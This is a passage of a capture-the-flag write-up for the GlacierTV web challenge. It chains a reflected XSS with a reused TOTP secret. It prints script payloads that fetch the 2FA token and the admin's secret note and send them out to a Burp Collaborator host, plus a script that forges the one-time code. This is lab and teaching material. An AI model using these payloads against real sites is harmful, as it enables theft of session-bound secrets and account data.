admin and achieve the flag but it was quite different as http only flag was set and even we get cookie we cant get the 2FA token to get flag.</p><h3 name="fd93" id="fd93" class="graf graf--h3 graf-after--p">Points to consider/ Features:</h3><h4 name="0aa7" id="0aa7" class="graf graf--h4 graf-after--h3"><strong class="markup--strong markup--h4-strong">http only cookie</strong></h4><p name="d7ae" id="d7ae" class="graf graf--p graf-after--h4">Unlucky http only option was set on cookie so no cookie stealing .</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="less" name="2d97" id="2d97" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-selector-tag">app</span><span class="hljs-selector-class">.use</span>(<span class="hljs-built_in">session</span>({<br />    <span class="hljs-attribute">secret</span>: crypto.<span class="hljs-built_in">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-built_in">toString</span>(<span class="hljs-string">&quot;base64&quot;</span>),<br />    <span class="hljs-attribute">cookie</span>: {<br />        <span class="hljs-attribute">httpOnly</span>: true<br />    }<br />}))</span></pre><h4 name="1fd8" id="1fd8" class="graf graf--h4 graf-after--pre"><strong class="markup--strong markup--h4-strong">/setup_2fa</strong></h4><p name="5a73" id="5a73" class="graf graf--p graf-after--h4">Creates the token with random secret and displays it in json format.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="php" name="3c26" id="3c26" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">totp</span> = <span class="hljs-keyword">new</span> otpauth.<span class="hljs-title function_ invoke__">TOTP</span>({<br />        <span class="hljs-attr">issuer</span>: <span class="hljs-string">&quot;GlacierTV&quot;</span>,<br />        <span class="hljs-attr">label</span>: <span class="hljs-string">&quot;2FA&quot;</span>,<br />        <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&quot;SHA3-384&quot;</span>,<br />        <span class="hljs-attr">digits</span>: <span class="hljs-number">9</span>,<br />        <span class="hljs-attr">period</span>: <span class="hljs-number">43</span>,<br />        <span class="hljs-attr">secret</span>: <span class="hljs-title function_ invoke__">getTOTPSecretToken</span>()<br />    });<br />    totp_tokens[sessionId] = totp<br />    res.<span class="hljs-title function_ invoke__">json</span>({<br />        <span class="hljs-string">&quot;totp&quot;</span>: totp.<span class="hljs-title function_ invoke__">toString</span>()<br />    })</span></pre><h4 name="20e4" id="20e4" class="graf graf--h4 graf-after--pre"><strong class="markup--strong markup--h4-strong">POST /secret_note</strong></h4><p name="6375" id="6375" class="graf graf--p graf-after--h4">Creates the secret note if POST request is sent with message body .</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="javascript" name="d1d6" id="d1d6" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/secret_note&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {<br />    <span class="hljs-keyword">const</span> sessionId = req.<span class="hljs-property">session</span>.<span class="hljs-property">id</span>;<br />    <span class="hljs-keyword">const</span> message = req.<span class="hljs-property">body</span>.<span class="hljs-property">message</span>;<br />    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> message !== <span class="hljs-string">&quot;string&quot;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;No message given&quot;</span>);<br />    secret_notes[sessionId] = message;</span></pre><h4 name="1a41" id="1a41" class="graf graf--h4 graf-after--pre"><strong class="markup--strong markup--h4-strong">GET /secret_note</strong></h4><p name="68f6" id="68f6" class="graf graf--p graf-after--h4">IF GET req is sent with token with OPT value forged with token created in /setup_2fa .</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="javascript" name="be8f" id="be8f" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/secret_note&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {<br />    <span class="hljs-keyword">const</span> sessionId = req.<span class="hljs-property">session</span>.<span class="hljs-property">id</span>;<br />    ......<br />    res.<span class="hljs-title function_">json</span>({<br />        <span class="hljs-attr">message</span>: secret_notes[sessionId]<br />    })<br />  </span></pre><h4 name="7886" id="7886" class="graf graf--h4 graf-after--pre">POST /report feature</h4><h4 name="ee75" id="ee75" class="graf graf--h4 graf-after--h4">This Features runs the puppeteer browsers</h4><p name="0274" id="0274" class="graf graf--p graf-after--h4">a. Navigate to <a href="http://localhost:8080" data-href="http://localhost:8080" class="markup--anchor markup--p-anchor" target="_blank">http://localhost:8080</a> in new incognito window .</p><p name="bfbd" id="bfbd" class="graf graf--p graf-after--p">b. creates the 2fa token and set secret_note which is flag .</p><p name="8eb4" id="8eb4" class="graf graf--p graf-after--p">c. redirects then to our URL submitted .</p><p name="e2a6" id="e2a6" class="graf graf--p graf-after--p">d. Closes the browser.</p><h3 name="b033" id="b033" class="graf graf--h3 graf-after--p">Finding flaw:</h3><p name="7f6e" id="7f6e" class="graf graf--p graf-after--h3"><strong class="markup--strong markup--p-strong">Finding XSS:</strong></p><p name="2067" id="2067" class="graf graf--p graf-after--p">There is 2 XSS in the app, One in view and another is in the iframe box via srcdoc , Since VIEW feature requires user interaction we we will stick with another one .</p><figure name="be4f" id="be4f" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*zYNfjU1KKBuPIu04DUQ_Nw.png" data-width="1215" data-height="355" src="https://cdn-images-1.medium.com/max/800/1*zYNfjU1KKBuPIu04DUQ_Nw.png"><figcaption class="imageCaption">XSS fired</figcaption></figure><p name="32d8" id="32d8" class="graf graf--p graf-after--figure"><strong class="markup--strong markup--p-strong">Payload used :</strong></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="xml" name="fa4a" id="fa4a" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">https://www.youtube.com/embed/dQw4w9WgXcQ?&amp;autoplay=1&quot;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></pre><p name="2813" id="2813" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">Flaw in OPT :</strong></p><p name="3b48" id="3b48" class="graf graf--p graf-after--p">Here, i realized that we all are receiving the same OPT token again and again .</p><p name="3aed" id="3aed" class="graf graf--p graf-after--p">Token:</p><p name="02f1" id="02f1" class="graf graf--p graf-after--p"><em class="markup--em markup--p-em">otpauth://totp/GlacierTV:2FA?issuer=GlacierTV&amp;secret=&lt;SAME SECRET&gt;&amp;algorithm=SHA3–384&amp;digits=9&amp;period=43</em></p><figure name="c504" id="c504" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*5X7ZBj6YA8sa5iMdNLxj8A.png" data-width="512" data-height="843" src="https://cdn-images-1.medium.com/max/800/1*5X7ZBj6YA8sa5iMdNLxj8A.png"><figcaption class="imageCaption">Both the token is same</figcaption></figure><p name="e319" id="e319" class="graf graf--p graf-after--figure">Delete the cookie and try again same 2FA token is created everytime :)</p><p name="08cb" id="08cb" class="graf graf--p graf-after--p">**After ctf was over i found that it was due to some babel issue .***</p><h3 name="adaa" id="adaa" class="graf graf--h3 graf-after--p">Building exploit:</h3><figure name="c565" id="c565" class="graf graf--figure graf--iframe graf-after--h3"><iframe src="https://giphy.com/embed/BpGWitbFZflfSUYuZ9/twitter/iframe" width="435" height="362" frameborder="0" scrolling="no"></iframe></figure><p name="f25a" id="f25a" class="graf graf--p graf-after--figure">We have XSS and token flaw , Lets abuse it to get flag.</p><p name="e6c2" id="e6c2" class="graf graf--p graf-after--p">Step1: Craft the XSS payload to create the 2FA token and leak that token using web hook .Report the link .</p><p name="52a0" id="52a0" class="graf graf--p graf-after--p">Step2: Get that token and create the OPT code from received token .</p><p name="4c1b" id="4c1b" class="graf graf--p graf-after--p">Step3: Craft another XSS payload which will get request to get secret_notes with query ?token=Forged OPT .code then to leak it using again weekhook .</p><p name="7cd9" id="7cd9" class="graf graf--p graf-after--p">POC for Step1:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="dart" name="4179" id="4179" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-meta">@google</span>.com<span class="hljs-string">&quot;&gt;https://www.youtube.com/embed/dQw4w9WgXcQ?@google.com&quot;</span>&gt;<br /><span class="hljs-meta">@google</span>.com<span class="hljs-string">&quot;&gt;https://www.youtube.com/embed/dQw4w9WgXcQ?@google.com&quot;</span>&gt;<br />&lt;/iframe&gt;&lt;script&gt;fetch(<span class="hljs-string">&#x27;http://localhost:8080/setup_2fa&#x27;</span>,{<span class="hljs-string">&#x27;method&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;mode&#x27;</span>: <span class="hljs-string">&#x27;cors&#x27;</span>,<span class="hljs-string">&#x27;credentials&#x27;</span>: <span class="hljs-string">&#x27;omit&#x27;</span>})<br />.then(response =&gt;{<span class="hljs-keyword">return</span> response.json();}).then(data =&gt;<br />{<span class="hljs-built_in">document</span>.location=<span class="hljs-string">&#x27;http://d6k6wj9lhjr4ft0dj1fex9rsrjx9ly.burpcollaborator.net?c=&#x27;</span>+btoa(data.totp);})<br />.<span class="hljs-keyword">catch</span>(error =&gt; {});<br />&lt;/script&gt;</span></pre><p name="950e" id="950e" class="graf graf--p graf-after--pre">POC for Step2:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="php" name="b35e" id="b35e" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">OTPAuth</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;otpauth&quot;</span>)<br />let totp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OTPAuth</span>.<span class="hljs-title function_ invoke__">TOTP</span>({<br />    <span class="hljs-attr">issuer</span>: <span class="hljs-string">&quot;GlacierTV&quot;</span>,<br />    <span class="hljs-attr">label</span>: <span class="hljs-string">&quot;2FA&quot;</span>,<br />    <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&quot;SHA3-384&quot;</span>,<br />    <span class="hljs-attr">digits</span>: <span class="hljs-number">9</span>,<br />    <span class="hljs-attr">period</span>: <span class="hljs-number">43</span>,<br />    <span class="hljs-attr">secret</span>: <span class="hljs-string">&quot;GCDJCQ4BGU3SY2YQKPD666LPZTVHZN2TFWBCUX44S2QE4H4LEPEQ&quot;</span>, //Leaked token <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;OTPAuth.Secret.fromBase32(&quot;NB2W45DFOIZA&quot;)&#x27;</span> //<br />  });<br /><br />  <span class="hljs-comment">// </span><br />  <span class="hljs-comment">// Generate a token (returns the current token as a string).</span><br />  let token = totp.<span class="hljs-title function_ invoke__">generate</span>();<br />  console.<span class="hljs-title function_ invoke__">log</span>(token)</span></pre><p name="3bc8" id="3bc8" class="graf graf--p graf-after--pre">POC for Step 3</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="xml" name="95df" id="95df" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">@google.com&quot;&gt;https://www.youtube.com/embed/dQw4w9WgXcQ?@google.com&quot;&gt;<br /><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://localhost:8080/secret_note?token=158690365&#x27;</span>,{<span class="hljs-string">&#x27;method&#x27;</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;mode&#x27;</span>: <span class="hljs-string">&#x27;cors&#x27;</span>,<span class="hljs-string">&#x27;credentials&#x27;</span>: <span class="hljs-string">&#x27;include&#x27;</span>})<br />.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span>{<span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();})<br />.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span>{<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://d6k6wj9lhjr4ft0dj1fex9rsrjx9ly.burpcollaborator.net?data=&#x27;</span><br />+<span class="hljs-title function_">btoa</span>(data.<span class="hljs-property">message</span>);}).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {});<br /></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></pre><h3 name="53ba" id="53ba" class="graf graf--h3 graf-after--pre"><strong class="markup--strong markup--h3-strong">Flag:</strong></h3><p name="25b0" id="25b0" class="graf graf--p graf-after--h3">Check the web hook URL then decode the base64 encoded data . We get FLAG got 30th solve .</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="json" name="6c08" id="6c08" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><br /><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;gctf{b3_CaR3fUl_WiTh_JavAScR1pT_C0mP1L3rS_!!1}&quot;</span><span class="hljs-punctuation">}</span></span></pre><h3 name="929a" id="929a" class="graf graf--h3 graf-after--pre"><strong class="markup--strong markup--h3-strong">Conclusion</strong></h3><p name="629e" id="629e" class="graf graf--p graf-after--h3">A simple reflected XSS can be deadly if chained with other app flaws .</p><p name="51ee" id="51ee" class="graf graf--p graf-after--p">See ya cheers .</p><h3 name="2d8f" id="2d8f" class="graf graf--h3 graf-after--p"><strong class="markup--strong markup--h3-strong">Refences:</strong></h3><p name="d7bd" id="d7bd" class="graf graf--p graf-after--h3 graf--trailing"><a href="https://portswigger.net/web-security/cross-site-scripting" data-href="https://portswigger.net/web-security/cross-site-scripting" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://portswigger.net/web-security/cross-site-scripting</a></p></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@dotconcat" class="p-author h-card">.concat()</a> on <a href="https://medium.com/p/c7e7e9441197"><time class="dt-published" date

  <div class="prev"><a href="/romiyokarki">Prev</a></div>
  <div class="next"><a href="/romiyokarki">Next</a></div>

<div class="footer">
  <span class="copy">&copy; Romiyo karki</span>
  </div>
<!-- partial -->
  
</body>
</html>
